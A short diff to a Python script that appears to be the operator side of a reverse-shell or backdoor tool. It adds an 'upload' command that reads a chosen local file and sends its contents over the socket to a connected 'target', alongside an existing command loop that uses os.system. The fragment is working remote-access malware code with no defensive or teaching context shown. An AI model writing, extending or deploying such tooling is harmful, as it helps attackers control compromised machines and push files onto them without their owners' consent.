@@ -18,6 +18,10 @@ def reliable_rcv():
         except ValueError:
             continue
 
+def upload_file(filename):
+    f = open(filename, 'rb')
+    target.send(f.read())
+
 
 try:
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -50,6 +54,9 @@ try:
 
             elif command == "clear":
                 os.system("clear")
+
+            elif command[:6] == "upload":
+                upload_file(command[7:])
 
             else:
                 result = reliable_rcv()
